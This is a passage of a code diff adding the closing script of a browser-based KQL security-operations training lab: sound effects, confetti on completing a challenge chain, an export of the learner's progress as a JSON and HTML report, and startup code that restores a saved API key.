+                const o = ctx.createOscillator();
+                const g = ctx.createGain();
+                o.connect(g); g.connect(ctx.destination);
+                o.frequency.value = freq;
+                o.type = "sine";
+                g.gain.setValueAtTime(0.3, ctx.currentTime + i * 0.1);
+                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.1 + 0.3);
+                o.start(ctx.currentTime + i * 0.1);
+                o.stop(ctx.currentTime + i * 0.1 + 0.3);
+            });
+        }
+
+        function playError() {
+            if (!soundEnabled) return;
+            const ctx = new AudioContext();
+            const o = ctx.createOscillator();
+            const g = ctx.createGain();
+            o.connect(g); g.connect(ctx.destination);
+            o.type = "sawtooth";
+            o.frequency.setValueAtTime(200, ctx.currentTime);
+            o.frequency.exponentialRampToValueAtTime(80, ctx.currentTime + 0.3);
+            g.gain.setValueAtTime(0.3, ctx.currentTime);
+            g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
+            o.start(); o.stop(ctx.currentTime + 0.3);
+        }
+
+        function playChainComplete() {
+            if (!soundEnabled) return;
+            const ctx = new AudioContext();
+            [523, 659, 784, 880, 1047, 1319].forEach((freq, i) => {
+                const o = ctx.createOscillator();
+                const g = ctx.createGain();
+                o.connect(g); g.connect(ctx.destination);
+                o.frequency.value = freq;
+                o.type = "sine";
+                g.gain.setValueAtTime(0.25, ctx.currentTime + i * 0.08);
+                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.08 + 0.4);
+                o.start(ctx.currentTime + i * 0.08);
+                o.stop(ctx.currentTime + i * 0.08 + 0.4);
+            });
+        }
+
+        function checkChainCompletion(chainId) {
+            const chainChallenges = CHALLENGES.filter(c => c.chain === chainId);
+            const allDone = chainChallenges.every(c => completedIds.has(c.id));
+            if (allDone && !chainCompletedIds.has(chainId)) {
+                chainCompletedIds.add(chainId);
+                localStorage.setItem("kql_chains_done", JSON.stringify([...chainCompletedIds]));
+                triggerChainConfetti(chainId);
+                playChainComplete();
+            }
+        }
+
+        function triggerChainConfetti(chainId) {
+            const colors = {1:"#00d4ff",2:"#ffb520",3:"#a855f7",4:"#00ff88",5:"#ff2b5e",6:"#ffffff"};
+            const color = colors[chainId] || "#00d4ff";
+            const duration = 3000;
+            const end = Date.now() + duration;
+            const frame = () => {
+                confetti({ particleCount: 6, angle: 60, spread: 55, origin: { x: 0 }, colors: [color, "#ffffff"] });
+                confetti({ particleCount: 6, angle: 120, spread: 55, origin: { x: 1 }, colors: [color, "#ffffff"] });
+                if (Date.now() < end) requestAnimationFrame(frame);
+            };
+            frame();
+            const banner = document.createElement("div");
+            banner.style.cssText = `position:fixed;top:80px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,${color}22,${color}11);border:2px solid ${color};border-radius:12px;padding:16px 32px;font-family:'Orbitron',monospace;font-size:18px;color:${color};z-index:9000;text-align:center;box-shadow:0 0 40px ${color}44;animation:fadeIn 0.3s ease`;
+            banner.innerHTML = `🎉 CHAIN COMPLETE! <br><span style="font-size:12px;color:#9cb8d4">${CHAINS[chainId].name} — All challenges solved!</span>`;
+            document.body.appendChild(banner);
+            setTimeout(() => banner.remove(), 4000);
+        }
+
+        function exportReport() {
+            const completedChallenges = CHALLENGES.filter(c => completedIds.has(c.id)).map(c => ({
+                id: c.id,
+                title: c.title,
+                chain: CHAINS[c.chain].name,
+                stage: c.stage,
+                difficulty: c.difficulty,
+                xpEarned: c.xp,
+                commandsPracticed: c.commands
+            }));
+            const skippedChallenges = CHALLENGES.filter(c => skippedIds.has(c.id)).map(c => ({
+                id: c.id, title: c.title, difficulty: c.difficulty
+            }));
+            const report = {
+                exportDate: new Date().toISOString(),
+                labName: "KQL SOC Lab — Meridian Financial Group Incident",
+                summary: {
+                    totalXP: score,
+                    correctAnswers: correctCount,
+                    skippedChallenges: skippedCount,
+                    totalChallenges: CHALLENGES.length,
+                    completionRate: Math.round((completedIds.size / CHALLENGES.length) * 100) + "%",
+                    commandsMastered: [...commandsDone],
+                    commandsRemaining: ALL_COMMANDS.filter(c => !commandsDone.has(c)),
+                    chainsCompleted: [...chainCompletedIds].map(id => CHAINS[id].name)
+                },
+                completedChallenges,
+                skippedChallenges
+            };
+
+            const blob = new Blob([JSON.stringify(report, null, 2)], { type: "application/json" });
+            const a = document.createElement("a");
+            a.href = URL.createObjectURL(blob);
+            a.download = `KQL_Lab_Report_${new Date().toISOString().split("T")[0]}.json`;
+            a.click();
+
+            const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>KQL Lab Report</title>
+            <style>body{font-family:monospace;background:#05080f;color:#9cb8d4;padding:40px;max-width:900px;margin:0 auto}
+            h1{color:#00d4ff;font-size:28px;margin-bottom:4px}
+            h2{color:#ffb520;font-size:16px;border-bottom:1px solid #1c2d47;padding-bottom:8px;margin-top:32px}
+            .stat{display:inline-block;background:#0b1120;border:1px solid #1c2d47;border-radius:8px;padding:16px 24px;margin:8px;text-align:center}
+            .stat-val{font-size:32px;color:#00d4ff;display:block}.stat-lbl{font-size:12px;color:#6b8aa8}
+            .tag{display:inline-block;background:#0b1120;border:1px solid #243857;border-radius:4px;padding:3px 8px;margin:3px;font-size:12px}
+            .done{border-color:rgba(0,255,136,0.4);color:#00ff88}.skip{border-color:rgba(255,181,32,0.3);color:#ffb520}
+            table{width:100%;border-collapse:collapse;margin-top:12px}
+            th{text-align:left;color:#6b8aa8;font-size:11px;letter-spacing:1px;padding:8px;border-bottom:1px solid #1c2d47}
+            td{padding:8px;border-bottom:1px solid #0b1120;font-size:13px}
+            tr:hover td{background:#0b1120}</style></head><body>
+            <h1>⚡ KQL SOC Lab — Progress Report</h1>
+            <p style="color:#6b8aa8">Generated: ${new Date().toLocaleString()}</p>
+            <div>
+              <div class="stat"><span class="stat-val">${score.toLocaleString()}</span><span class="stat-lbl">Total XP</span></div>
+              <div class="stat"><span class="stat-val" style="color:#00ff88">${correctCount}</span><span class="stat-lbl">Correct</span></div>
+              <div class="stat"><span class="stat-val" style="color:#ffb520">${skippedCount}</span><span class="stat-lbl">Skipped</span></div>
+              <div class="stat"><span class="stat-val" style="color:#a855f7">${Math.round((completedIds.size/CHALLENGES.length)*100)}%</span><span class="stat-lbl">Complete</span></div>
+            </div>
+            <h2>Commands Mastered (${commandsDone.size} / ${ALL_COMMANDS.length})</h2>
+            <div>${ALL_COMMANDS.map(c=>`<span class="tag ${commandsDone.has(c)?'done':''}">${c}</span>`).join("")}</div>
+            <h2>Completed Challenges</h2>
+            <table><tr><th>#</th><th>Title</th><th>Chain</th><th>Difficulty</th><th>XP</th></tr>
+            ${completedChallenges.map(c=>`<tr><td>${c.id}</td><td>${c.title}</td><td>${CHAINS[c.chain].name}</td><td>${c.difficulty}</td><td style="color:#00d4ff">+${c.xpEarned}</td></tr>`).join("")}
+            </table>
+            <h2>Skipped Challenges</h2>
+            <div>${skippedChallenges.map(c=>`<span class="tag skip">#${c.id} ${c.title}</span>`).join("") || "<span style='color:#6b8aa8'>None skipped</span>"}</div>
+            </body></html>`;
+            const w = window.open("", "_blank");
+            w.document.write(html);
+            w.document.close();
+        }
+
+        // Init
+        window.addEventListener("load", () => {
+            const savedKey = localStorage.getItem("kql_groq_key");
+            if (savedKey && savedKey.trim()) {
+                apiKey = savedKey;
+                document.getElementById("apiKeyInput").value = savedKey;
+                startLab();
+            }
+        });
+    </script>
+</body>
+
+</html>
